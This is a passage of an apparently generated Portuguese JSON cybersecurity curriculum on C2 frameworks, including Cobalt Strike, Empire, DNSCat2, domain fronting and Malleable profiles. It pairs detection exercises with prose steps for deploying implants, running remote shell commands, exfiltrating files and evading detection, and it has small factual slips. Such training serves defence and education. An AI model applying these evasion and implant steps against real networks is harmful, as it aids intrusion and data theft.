                                    "Identificar funções: receber conexões de implants e gerenciar sessões.",
                                    "Simular configuração básica em ambiente virtual (sem execução real)."
                                  ],
                                  "verification": "Listar 3 funções principais do listener e 2 exemplos de protocolos suportados.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Documentação Cobalt Strike: Listeners",
                                    "Empire GitHub Wiki: Listeners",
                                    "Ferramenta de diagramação como Draw.io"
                                  ],
                                  "tips": "Foquem em protocolos stealth como HTTPS para entender evasão de detecção.",
                                  "learningObjective": "Reconhecer o papel e configurações do servidor C2 (listener).",
                                  "commonMistakes": "Achar que listener é o implant; listener é sempre no lado atacante."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar o Agente/Implant (Stager ou Payload)",
                                  "subSteps": [
                                    "Diferenciar stager (pequeno downloader) de payload (implant funcional).",
                                    "Analisar geração de payloads em ferramentas: Cobalt Strike stageless vs. staged.",
                                    "Estudar comunicação: beaconing para listener.",
                                    "Identificar características: persistência, evasão AV, módulos carregáveis.",
                                    "Mapear ciclo de vida: infecção, callback, C2."
                                  ],
                                  "verification": "Desenhar um diagrama simples do ciclo de vida do implant.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "MITRE ATT&CK: T1071 Application Layer Protocol",
                                    "Cobalt Strike User Guide: Payloads",
                                    "Empire Stagers documentation"
                                  ],
                                  "tips": "Teste geração de payloads em VMs isoladas para visualização (apenas leitura).",
                                  "learningObjective": "Identificar e descrever o agente/implant em frameworks C2.",
                                  "commonMistakes": "Ignorar staged vs. stageless; staged é mais stealth em alguns cenários."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Entender o Handler e Integração dos Componentes",
                                  "subSteps": [
                                    "Definir handler como interface de controle no servidor.",
                                    "Explorar comandos: interagir com sessões ativas.",
                                    "Analisar integração: listener recebe, handler gerencia implants.",
                                    "Comparar UIs: Cobalt Strike GUI vs. Empire CLI.",
                                    "Simular fluxos completos com pseudocódigo ou diagramas."
                                  ],
                                  "verification": "Explicar em 5 frases como handler, listener e implant interagem.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Vídeo tutorial Cobalt Strike basics (YouTube canais de segurança autorizados)",
                                    "Empire Handler guide"
                                  ],
                                  "tips": "Pense em handler como o 'controle remoto' do framework.",
                                  "learningObjective": "Compreender o handler e a arquitetura integrada de um framework C2.",
                                  "commonMistakes": "Confundir handler com listener; handler é a ferramenta de gerenciamento."
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Sintetizar e Comparar Frameworks C2",
                                  "subSteps": [
                                    "Criar tabela comparativa: Cobalt Strike vs. Empire (componentes).",
                                    "Identificar semelhanças e diferenças nos três componentes principais.",
                                    "Revisar IOCs associados: domínios, user-agents, beacons.",
                                    "Discutir detecção: logs de rede, comportamento anômalo.",
                                    "Testar conhecimento com quiz autoavaliativo."
                                  ],
                                  "verification": "Preencher tabela comparativa com pelo menos 3 linhas por componente.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Tabela modelo em Google Sheets",
                                    "Relatórios de threat hunting sobre C2 (ex: Atomic Red Team)"
                                  ],
                                  "tips": "Use IOCs públicos para prática de identificação sem ferramentas reais.",
                                  "learningObjective": "Comparar e sintetizar componentes em frameworks reais.",
                                  "commonMistakes": "Generalizar demais; cada ferramenta tem nuances específicas."
                                }
                              ],
                              "practicalExample": "Em Cobalt Strike: 1) Configure um HTTP listener no teamserver (porta 80). 2) Gere um stager payload (windows/beacon_http). 3) Implante o stager na vítima, que baixa o payload. 4) Use o handler (Aggressor Script ou GUI) para comandos como 'beacon> shell'. Isso demonstra listener recebendo, implant comunicando e handler controlando.",
                              "finalVerifications": [
                                "Pode listar e definir listener, implant e handler corretamente?",
                                "Descreve o fluxo de comunicação C2 com diagrama?",
                                "Identifica diferenças entre Cobalt Strike e Empire?",
                                "Reconhece IOCs típicos de cada componente?",
                                "Explica staged vs. stageless payloads?",
                                "Compara arquitetura básica com exemplos reais?"
                              ],
                              "assessmentCriteria": [
                                "Precisão na definição dos 3 componentes principais (90% correto).",
                                "Qualidade do diagrama de arquitetura (claro, completo, rotulado).",
                                "Profundidade na comparação de ferramentas (pelo menos 3 diferenças).",
                                "Identificação correta de pelo menos 5 IOCs associados.",
                                "Capacidade de explicar integrações sem erros conceituais.",
                                "Uso de exemplos práticos e verificáveis."
                              ],
                              "crossCurricularConnections": [
                                "Redes: Protocolos de aplicação (HTTP/S, DNS) e análise de tráfego.",
                                "Programação: Desenvolvimento de payloads em linguagens como C# ou PowerShell.",
                                "Análise Forense: Detecção de IOCs em logs e memória.",
                                "Ética e Direito: Uso autorizado em Red Team vs. APTs maliciosos."
                              ],
                              "realWorldApplication": "Em exercícios de Red Team autorizados ou Blue Team defense, identificar frameworks C2 como Cobalt Strike em tráfego de rede ajuda a detectar compromissos persistentes, permitindo respostas rápidas como bloqueio de listeners ou hunting de implants em endpoints."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.3.1.2",
                            "name": "Diferenciar modelos de comunicação pull e push em C2",
                            "description": "Explicar o modelo pull (implante consulta periodicamente o servidor) versus push (servidor envia comandos diretamente), analisando vantagens em stealth e latência, com referências a operações reais de adversários.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o Modelo Pull em C2",
                                  "subSteps": [
                                    "Defina o modelo pull: o implante (beacon) no sistema vítima consulta periodicamente um servidor C2 para comandos.",
                                    "Explique o mecanismo: usa HTTP/S GET requests em intervalos regulares (ex: a cada 60s).",
                                    "Descreva o fluxo: implante envia status, servidor responde com tarefas se disponíveis.",
                                    "Identifique componentes chave: beacon interval, jitter para randomização.",
                                    "Registre exemplos de ferramentas: Cobalt Strike beacons."
                                  ],
                                  "verification": "Crie um diagrama simples do fluxo pull e explique verbalmente para um par.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Papel e caneta para diagrama",
                                    "Documentação Cobalt Strike (disponível online)",
                                    "Vídeo tutorial sobre beacons"
                                  ],
                                  "tips": "Use jitter para evitar detecção por padrões regulares de tráfego.",
                                  "learningObjective": "Explicar precisamente como o pull funciona e seus componentes básicos.",
                                  "commonMistakes": [
                                    "Confundir pull com polling genérico sem contexto C2",
                                    "Ignorar jitter como fator de stealth"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Compreender o Modelo Push em C2",
                                  "subSteps": [
                                    "Defina o modelo push: servidor C2 envia comandos diretamente ao implante via conexões persistentes.",
                                    "Explique o mecanismo: usa WebSockets, TCP persistente ou reverse shells para push imediato.",
                                    "Descreva o fluxo: servidor inicia comunicação ao detectar implante online.",
                                    "Identifique componentes chave: keep-alive connections, callbacks para status.",
                                    "Compare brevemente com pull: push requer conexão ativa constante."
                                  ],
                                  "verification": "Desenhe um diagrama contrastando push com pull do step anterior.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Ferramenta de diagrama como Draw.io",
                                    "Artigos sobre Empire framework (push capabilities)",
                                    "Exemplos de código WebSocket para C2"
                                  ],
                                  "tips": "Monitore portas para push, pois são mais visíveis em firewalls.",
                                  "learningObjective": "Descrever o funcionamento do push e suas diferenças iniciais com pull.",
                                  "commonMistakes": [
                                    "Achar que push é sempre mais stealth",
                                    "Não notar necessidade de conexão outbound persistente"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar Vantagens e Desvantagens: Stealth e Latência",
                                  "subSteps": [
                                    "Compare stealth: pull é mais furtivo (tráfego esporádico outbound), push é detectável (conexões inbound/long-lived).",
                                    "Compare latência: push tem baixa latência (comandos instantâneos), pull tem delay (beacon interval).",
                                    "Liste prós pull: evade firewalls, menor footprint; contras: delay em respostas.",
                                    "Liste prós push: real-time control; contras: alta visibilidade, bloqueio por NAT.",
                                    "Crie tabela comparativa com métricas qualitativas."
                                  ],
                                  "verification": "Preencha e discuta uma tabela de comparação com um colega ou gravando explicação.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Planilha Google Sheets para tabela",
                                    "Relatórios MITRE ATT&CK sobre C2 (TA0011)",
                                    "Ferramenta Wireshark para simular tráfego"
                                  ],
                                  "tips": "Considere cenários de rede: pull melhor para air-gapped, push para intra-rede.",
                                  "learningObjective": "Analisar trade-offs quantitativos e qualitativos entre pull e push.",
                                  "commonMistakes": [
                                    "Superestimar stealth do push",
                                    "Ignorar impacto de jitter na latência pull"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Referenciar Operações Reais de Adversários",
                                  "subSteps": [
                                    "Pesquise operação APT28 (Fancy Bear): uso de pull em HTTP para stealth.",
                                    "Analise APT41: mix de pull/push em ferramentas custom.",
                                    "Estude Lazarus Group: push em reverse shells para latência baixa em heists.",
                                    "Mapeie IOCs: domínios beacon para pull, portas persistentes para push.",
                                    "Discuta evolução: adversários migram para pull por detecção crescente de push."
                                  ],
                                  "verification": "Compile 3 exemplos reais com IOCs e explique escolhas de modelo.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "MITRE ATT&CK Navigator",
                                    "Relatórios FireEye/Mandiant sobre APTs",
                                    "VirusTotal para IOCs"
                                  ],
                                  "tips": "Use ATT&CK para mapear táticas T1071 (C2 protocols).",
                                  "learningObjective": "Conectar conceitos teóricos a casos reais de adversários.",
                                  "commonMistakes": [
                                    "Citar exemplos genéricos sem ligação a pull/push",
                                    "Não contextualizar com stealth/latência"
                                  ]
                                }
                              ],
                              "practicalExample": "Simule um C2 pull com Python: crie um script beacon que faz GET requests a um Flask server a cada 60s com jitter 20%. Para push, use WebSockets (socket.io) onde server envia 'whoami' ao conectar. Monitore com Wireshark: observe tráfego esporádico no pull vs persistente no push.",
                              "finalVerifications": [
                                "Explicar diferença pull vs push sem hesitação.",
                                "Identificar IOCs de cada modelo em um log de tráfego.",
                                "Escolher modelo ideal para cenário stealth vs low-latency.",
                                "Citar 2 operações reais usando cada modelo.",
                                "Desenhar diagramas precisos de ambos fluxos.",
                                "Comparar trade-offs em uma tabela sem erros."
                              ],
                              "assessmentCriteria": [
                                "Precisão na definição e fluxo de pull/push (80%+ correto).",
                                "Análise equilibrada de stealth e latência com evidências.",
                                "Uso correto de exemplos reais de adversários.",
                                "Diagramas claros e rotulados.",
                                "Identificação de prós/contras contextualizados.",
                                "Aplicação prática em simulação ou análise de logs."
                              ],
                              "crossCurricularConnections": [
                                "Redes: Protocolos HTTP/WebSocket e análise de tráfego (Wireshark).",
                                "Programação: Scripts Python/Flask para protótipos C2.",
                                "Inteligência de Ameaças: Mapeamento MITRE ATT&CK (T1071).",
                                "Defesa Cibernética: Detecção de IOCs em SIEM.",
                                "Estratégia Militar: Analogia com comunicações burst/pull em ops especiais."
                              ],
                              "realWorldApplication": "Em equipes de threat hunting, diferenciar pull/push ajuda a priorizar alertas: pull beacons indicam infecções persistentes stealth (ex: monitorar GETs anômalos a domínios novos), enquanto push revela C2 ativo imediato (ex: bloquear WebSockets suspeitos), melhorando resposta a incidentes como SolarWinds (pull-heavy)."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.3.1.3",
                            "name": "Mapear o fluxo de comunicação em uma operação C2",
                            "description": "Desenhar e descrever o ciclo completo: infecção, callback inicial, autenticação, recebimento de comandos e exfiltração de dados, utilizando diagramas para ilustrar interações remotas.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Pesquisar e listar os componentes fundamentais do fluxo C2",
                                  "subSteps": [
                                    "Identificar os atores principais: máquina vítima infectada e servidor C2 remoto.",
                                    "Descrever cada fase sequencial: infecção inicial, callback, autenticação, recebimento de comandos e exfiltração.",
                                    "Pesquisar protocolos comuns usados (ex: HTTP/S, DNS, TCP).",
                                    "Listar indicadores típicos de cada fase (ex: domínios gerados dinamicamente para callback).",
                                    "Criar uma tabela resumindo fases, ações e fluxos de dados."
                                  ],
                                  "verification": "Tabela completa com 5 fases listadas corretamente e sem erros conceituais.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Acesso à internet para documentação MITRE ATT&CK",
                                    "Notebook ou editor de texto",
                                    "Papel e caneta para rascunhos"
                                  ],
                                  "tips": "Use frameworks como MITRE ATT&CK (TA0001: Initial Access a TA0011: Discovery) para validar fases.",
                                  "learningObjective": "Compreender a sequência lógica e os elementos chave de uma operação C2.",
                                  "commonMistakes": [
                                    "Confundir infecção com callback",
                                    "Omitir autenticação como etapa separada",
                                    "Ignorar protocolos de ofuscação"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Diagramar a infecção inicial e o callback",
                                  "subSteps": [
                                    "Desenhar a máquina vítima e o servidor C2 como nós iniciais.",
                                    "Ilustrar vetores de infecção (ex: phishing, exploit) com setas para a vítima.",
                                    "Mapear o callback: vítima envia beacon para C2 e recebe resposta.",
                                    "Adicionar timestamps ou labels para sequência temporal.",
                                    "Incluir exemplos de payloads no callback (ex: UUID da vítima)."
                                  ],
                                  "verification": "Diagrama parcial mostra fluxo bidirecional infecção → callback com labels claros.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Ferramenta de diagramação como Draw.io ou Lucidchart",
                                    "Referências de fluxos C2 reais (ex: imagens públicas de relatórios de malware)"
                                  ],
                                  "tips": "Use setas direcionais para indicar fluxo de controle e dados separadamente.",
                                  "learningObjective": "Visualizar graficamente as fases iniciais de estabelecimento de comunicação C2.",
                                  "commonMistakes": [
                                    "Representar callback como unidirecional",
                                    "Esquecer payloads de identificação no beacon",
                                    "Misturar infecção com persistência"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Mapear autenticação, recebimento de comandos e interações remotas",
                                  "subSteps": [
                                    "Adicionar camada de autenticação: troca de chaves ou tokens entre vítima e C2.",
                                    "Diagramar recebimento de comandos: C2 envia instruções (ex: keylog, screenshot).",
                                    "Mostrar loop de polling ou WebSocket para comandos contínuos.",
                                    "Incluir respostas da vítima confirmando execução.",
                                    "Destacar ofuscação (ex: codificação base64 em comandos)."
                                  ],
                                  "verification": "Diagrama atualizado inclui autenticação segura e loop de comandos com exemplos de interações.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Mesma ferramenta de diagramação",
                                    "Exemplos de tráfego C2 de Wireshark captures públicas"
                                  ],
                                  "tips": "Diferencie comandos de controle (ex: sleep) de ações de coleta.",
                                  "learningObjective": "Representar mecanismos de controle remoto e validação em C2.",
                                  "commonMistakes": [
                                    "Pular autenticação pós-callback",
                                    "Mostrar comandos como instantâneos em vez de loop",
                                    "Ignorar confirmações de ACK"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Completar com exfiltração de dados e revisar o diagrama",
                                  "subSteps": [
                                    "Diagramar exfiltração: vítima envia dados roubados (ex: credenciais) para C2.",
                                    "Adicionar canais de saída (ex: HTTP POST disfarçado).",
                                    "Incluir limpeza ou sleep para persistência pós-exfil.",
                                    "Revisar fluxo end-to-end por lacunas ou inconsistências.",
                                    "Anotar IOCs (ex: user-agents suspeitos) em cada seta."
                                  ],
                                  "verification": "Diagrama final cobre ciclo completo com anotações de IOCs e fluxo lógico.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Ferramenta de diagramação",
                                    "Checklist de verificação C2 (criar uma)"
                                  ],
                                  "tips": "Teste o diagrama narrando o fluxo em voz alta para validar sequência.",
                                  "learningObjective": "Integrar todas as fases em um diagrama coeso e acionável.",
                                  "commonMistakes": [
                                    "Exfiltração sem contexto de dados coletados",
                                    "Fluxo não cíclico para operações persistentes",
                                    "Sobrecarregar diagrama com detalhes desnecessários"
                                  ]
                                }
                              ],
                              "practicalExample": "Em uma simulação de Emotet, diagrame: (1) Infecção via email malicioso → DLL sideload; (2) Callback para DGA domain via HTTP GET com victimID; (3) Autenticação via RSA handshake; (4) Recebimento de comando 'download module'; (5) Exfiltração de cookies do browser via POST criptografado.",
                              "finalVerifications": [
                                "Diagrama inclui todas as 5 fases com setas sequenciais corretas.",
                                "IOCs anotados em pelo menos 3 interações (ex: domínios, user-agents).",
                                "Fluxo demonstra persistência (loops de callback/comandos).",
                                "Narrativa escrita explica o diagrama em 100-200 palavras.",
                                "Diagrama é legível e exportável em PNG/PDF.",
                                "Validação contra MITRE ATT&CK T1071 (C2 Protocols)."
                              ],
                              "assessmentCriteria": [
                                "Precisão técnica: Fases e protocolos alinhados com conceitos reais de C2 (30%).",
                                "Clareza visual: Diagrama intuitivo com labels, cores e setas (25%).",
                                "Completude: Cobertura total do ciclo sem omissões (20%).",
                                "Detalhamento de IOCs e ofuscação: Prático e relevante (15%).",
                                "Narrativa explicativa: Fluida e educativa (10%)."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Análise de protocolos TCP/UDP e tráfego ofuscado.",
                                "Análise de Malware: Identificação de behaviors em sandboxes.",
                                "Visualização de Dados: Uso de ferramentas como Draw.io para threat modeling.",
                                "Inteligência de Ameaças: Mapeamento de TTPs MITRE ATT&CK.",
                                "Programação: Simulação de beacons em Python (ex: sockets)."
                              ],
                              "realWorldApplication": "Em operações de Threat Hunting ou Red Team, mapear fluxos C2 permite detectar comunicações anômalas em redes corporativas, bloquear domínios maliciosos e mitigar APTs persistentes, como visto em incidentes SolarWinds."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.5.3.2",
                        "name": "Canais de Comunicação em C2",
                        "description": "Protocolos e métodos usados para troca discreta de comandos e dados entre operador e implantes, visando evasão de detecção em redes monitoradas.",
                        "specificSkills": [
                          {
                            "id": "10.1.5.3.2.1",
                            "name": "Descrever canais HTTP/HTTPS em C2",
                            "description": "Analisar o uso de tráfego web legítimo para mascarar comunicações C2, incluindo técnicas como domain fronting e Malleable C2 Profiles para customização de assinaturas.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Fundamentos de Canais HTTP/HTTPS em C2",
                                  "subSteps": [
                                    "Estude a estrutura básica de requisições HTTP/HTTPS e como elas são usadas em comunicações C2.",
                                    "Identifique diferenças entre tráfego HTTP legítimo e C2, como headers personalizados e payloads codificados.",
                                    "Revise protocolos TLS/SSL e seu papel no mascaramento de C2.",
                                    "Analise exemplos de beacons C2 periódicos em tráfego web.",
                                    "Compare com outros canais C2 como DNS ou ICMP."
                                  ],
                                  "verification": "Resuma em um diagrama as camadas de uma requisição HTTPS usada em C2.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Documentação HTTP/1.1 e HTTP/2",
                                    "Wireshark para captura de pacotes",
                                    "Artigos sobre C2 basics (MITRE ATT&CK)"
                                  ],
                                  "tips": "Use ferramentas como curl para simular requisições HTTP e observe headers.",
                                  "learningObjective": "Compreender como HTTP/HTTPS serve de canal para C2 devido à ubiquidade do tráfego web.",
                                  "commonMistakes": [
                                    "Confundir HTTP com HTTPS sem considerar TLS",
                                    "Ignorar normalização de tráfego por CDNs"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Domain Fronting em Canais C2",
                                  "subSteps": [
                                    "Defina domain fronting e seu uso para burlar filtros de rede.",
                                    "Estude como SNI (Server Name Indication) difere do Host header em TLS.",
                                    "Simule domain fronting com serviços como Google ou Cloudflare.",
                                    "Analise impactos em detecção por firewalls e proxies.",
                                    "Discuta limitações modernas após bloqueios por provedores de CDN."
                                  ],
                                  "verification": "Crie um exemplo de requisição curl demonstrando mismatch SNI/Host.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Ferramenta curl ou Postman",
                                    "Documentação TLS 1.3",
                                    "Relatórios de threat hunting sobre domain fronting"
                                  ],
                                  "tips": "Teste em ambiente lab com ngrok para simular fronting.",
                                  "learningObjective": "Explicar o mecanismo de domain fronting e sua evasão de censura.",
                                  "commonMistakes": [
                                    "Assumir que domain fronting ainda funciona amplamente em 2023+",
                                    "Não diferenciar SNI de Host header"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Malleable C2 Profiles para Customização",
                                  "subSteps": [
                                    "Instale e configure um framework como Cobalt Strike ou Covenant.",
                                    "Crie um profile Malleable básico alterando user-agents e headers.",
                                    "Personalize respostas HTTP para imitar sites legítimos (ex: JSON APIs).",
                                    "Teste o profile em tráfego capturado com Wireshark.",
                                    "Ajuste jitter e sleep para evitar detecção comportamental."
                                  ],
                                  "verification": "Gere um profile Malleable e capture tráfego que pareça com tráfego de um site conhecido.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Cobalt Strike trial ou Empire",
                                    "Editor de texto para profiles .profile",
                                    "Wireshark",
                                    "Exemplos de profiles no GitHub"
                                  ],
                                  "tips": "Comece com profiles prontos e modifique gradualmente.",
                                  "learningObjective": "Dominar customização de assinaturas C2 para mimetizar tráfego legítimo.",
                                  "commonMistakes": [
                                    "Profiles com jitter zero detectáveis por timing",
                                    "Headers inconsistentes com navegador real"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Técnicas de Mascaramento e Análise",
                                  "subSteps": [
                                    "Explore codificação de payloads em JSON/XML para se misturar com APIs.",
                                    "Analise uso de WebSockets e HTTP/2 para C2 persistente.",
                                    "Simule detecção com regras YARA ou Sigma para tráfego C2.",
                                    "Discuta mitigações como JA3 fingerprinting e análise de entropia.",
                                    "Crie um relatório de IOCs (Indicators of Compromise) para canais HTTP C2."
                                  ],
                                  "verification": "Identifique e documente 5 IOCs em uma captura de tráfego C2 simulado.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Wireshark com filtros HTTP",
                                    "Ferramentas JA3 (ja3er.com)",
                                    "MITRE ATT&CK T1071",
                                    "Sigma rules repo"
                                  ],
                                  "tips": "Use tshark para automação de análise em larga escala.",
                                  "learningObjective": "Aplicar técnicas de mascaramento e estratégias de detecção em cenários reais.",
                                  "commonMistakes": [
                                    "Focar só em payloads sem considerar metadados",
                                    "Ignorar chunked encoding"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Integração e Verificação Final",
                                  "subSteps": [
                                    "Integre domain fronting com Malleable profiles em um lab.",
                                    "Execute um exercício de red team simulado e capture todo tráfego.",
                                    "Analise com múltiplas ferramentas para validar evasão.",
                                    "Documente lições aprendidas e limitações.",
                                    "Planeje defesas como ML-based anomaly detection."
                                  ],
                                  "verification": "Produza um relatório completo com diagramas e capturas de tela.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Ambiente VM lab (Kali + Windows)",
                                    "Ferramentas SIEM como ELK Stack",
                                    "Threat model templates"
                                  ],
                                  "tips": "Registre tudo em vídeo para revisão.",
                                  "learningObjective": "Sintetizar conhecimentos em um fluxo C2 completo HTTP/HTTPS.",
                                  "commonMistakes": [
                                    "Testes sem rede isolada",
                                    "Relatórios sem evidências visuais"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um lab isolado, configure um Cobalt Strike team server com um Malleable profile que imita tráfego da API do Twitter (agora X). Use domain fronting via Cloudflare para o beacon inicial. Capture com Wireshark e verifique se o tráfego evade regras básicas de firewall, aparecendo como requisições legítimas de login.",
                              "finalVerifications": [
                                "Explicar verbalmente ou por escrito como domain fronting mascara C2.",
                                "Gerar e testar um Malleable profile customizado.",
                                "Identificar IOCs em uma pcap fornecida de tráfego C2 HTTP.",
                                "Discutir 3 limitações de canais HTTP/HTTPS em C2 modernos.",
                                "Simular detecção usando Wireshark e JA3.",
                                "Produzir diagrama de fluxo C2 completo."
                              ],
                              "assessmentCriteria": [
                                "Precisão técnica na descrição de conceitos (80%+ acurácia).",
                                "Qualidade e completude dos profiles e exemplos práticos.",
                                "Capacidade de análise em capturas de tráfego reais.",
                                "Profundidade nas discussões de evasão vs. detecção.",
                                "Clareza e estrutura do relatório final.",
                                "Criatividade em conexões com cenários reais."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Análise de protocolos TLS/HTTP.",
                                "Criptografia: Entendimento de SNI e certificate pinning.",
                                "Desenvolvimento Web: Mimicking APIs e WebSockets.",
                                "Análise de Malware: IOCs e behavioral analysis.",
                                "Inteligência de Ameaças: MITRE ATT&CK framework."
                              ],
                              "realWorldApplication": "Em exercícios de red teaming para simular APTs como APT29 usando C2 HTTP em operações cibernéticas; em SOCs para detectar comunicações disfarçadas em tráfego corporativo, prevenindo breaches via ferramentas como Zeek e Suricata."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.3.2.2",
                            "name": "Explicar DNS Tunneling como canal C2",
                            "description": "Detalhar como consultas DNS são exploradas para tunelamento de comandos e dados, com exemplos de ferramentas como DNSCat2 e limitações em firewalls DNS.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os Fundamentos do DNS e seu Tráfego Normal",
                                  "subSteps": [
                                    "Estude a estrutura de uma consulta DNS: header, questions, answers, authority e additional records.",
                                    "Identifique os tipos de registros DNS comuns (A, AAAA, TXT, CNAME) e como resolvem nomes para IPs.",
                                    "Analise o fluxo UDP/TCP porta 53 usado por DNS e por que é permitido em firewalls.",
                                    "Revise exemplos de tráfego DNS legítimo usando ferramentas como Wireshark para capturar pacotes.",
                                    "Diferencie consultas recursivas, iterativas e de cache."
                                  ],
                                  "verification": "Capture e analise 5 pacotes DNS reais em Wireshark, identificando todos os componentes corretamente.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Wireshark instalado",
                                    "Acesso a internet para consultas DNS reais",
                                    "Documentação RFC 1035 sobre DNS"
                                  ],
                                  "tips": "Use filtros Wireshark como 'dns' para isolar tráfego; compare com tráfego não-DNS.",
                                  "learningObjective": "Dominar a anatomia de pacotes DNS para contrastar com tráfego tunelado.",
                                  "commonMistakes": [
                                    "Confundir portas DNS com HTTP/HTTPS",
                                    "Ignorar payloads em registros TXT",
                                    "Não diferenciar UDP vs TCP em DNS"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar o Conceito de DNS Tunneling",
                                  "subSteps": [
                                    "Defina DNS tunneling: encapsular dados não-DNS em consultas/respostas DNS para bypass de filtros.",
                                    "Aprenda técnicas de codificação: Base32/Base64 em subdomínios ou payloads TXT.",
                                    "Entenda papéis: cliente (infectado) envia consultas longas; servidor malicioso responde com dados.",
                                    "Discuta limitações de tamanho: ~255 chars por label, fragmentação necessária para payloads grandes.",
                                    "Simule manualmente uma consulta tunelada usando nslookup ou dig com subdomínios codificados."
                                  ],
                                  "verification": "Crie e resolva uma consulta DNS manual com payload codificado em Base32 usando dig.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Ferramentas CLI: dig ou nslookup",
                                    "Calculadora online Base32",
                                    "Servidor DNS próprio para testes (ex: dnsmasq)"
                                  ],
                                  "tips": "Teste em ambiente isolado para evitar detecção; use domínios descartáveis.",
                                  "learningObjective": "Identificar como dados arbitrários são escondidos em campos DNS.",
                                  "commonMistakes": [
                                    "Exceder limites de label length",
                                    "Não fragmentar payloads",
                                    "Usar codificações legíveis como texto plano"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar DNS Tunneling como Canal C2 com Exemplos de Ferramentas",
                                  "subSteps": [
                                    "Instale e configure DNSCat2: gere chaves, inicie servidor e cliente.",
                                    "Execute um túnel C2: envie comandos shell do servidor para cliente via DNS.",
                                    "Capture tráfego com Wireshark e decode payloads para ver comandos/exfiltração.",
                                    "Compare com outras ferramentas: iodine (IP over DNS), dns2tcp.",
                                    "Teste exfiltração de dados: envie arquivo pequeno via túnel e receba de volta."
                                  ],
                                  "verification": "Estabeleça um túnel DNSCat2 funcional, execute 'whoami' remotamente e capture o tráfego.",
                                  "estimatedTime": "90 minutos",
                                  "materials": [
                                    "DNSCat2 GitHub repo",
                                    "VMs isoladas (Kali Linux attacker, vítima)",
                                    "Wireshark",
                                    "Domínio controlado"
                                  ],
                                  "tips": "Use domínios wildcard (*.seu-dominio.com); evite produção com rate limiting.",
                                  "learningObjective": "Demonstrar fluxo C2 completo: beaconing, comandos, exfil via DNS.",
                                  "commonMistakes": [
                                    "Firewall bloqueando DNS outbound",
                                    "Chaves assimétricas mismatch",
                                    "Não usar domínios próprios"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Identificar Limitações, Detecção e Mitigações",
                                  "subSteps": [
                                    "Liste limitações: baixa taxa de dados (~1-10kbps), alta latência, dependência de DNS server.",
                                    "Estude detecções: consultas de alta entropia, volume anormal, domínios longos aleatórios.",
                                    "Configure regras de firewall/DNS sinkhole para bloquear tunneling suspeito.",
                                    "Simule detecção: use ferramentas como Snort rules para DNS tunneling ou Suricata.",
                                    "Discuta mitigações: DNSSEC, rate limiting, inspeção profunda de pacotes (DPI)."
                                  ],
                                  "verification": "Crie e teste uma regra Snort que alerte em subdomínios de alta entropia em um lab.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Snort ou Suricata instalado",
                                    "Regras de detecção DNS tunneling",
                                    "Documentação de entropia Shannon"
                                  ],
                                  "tips": "Calcule entropia de strings com scripts Python; threshold >3.5 suspeito.",
                                  "learningObjective": "Avaliar viabilidade e defesas contra DNS C2.",
                                  "commonMistakes": [
                                    "Ignorar DNS over HTTPS/TLS modernos",
                                    "Subestimar ruído em tráfego legítimo",
                                    "Não testar falsos positivos"
                                  ]
                                }
                              ],
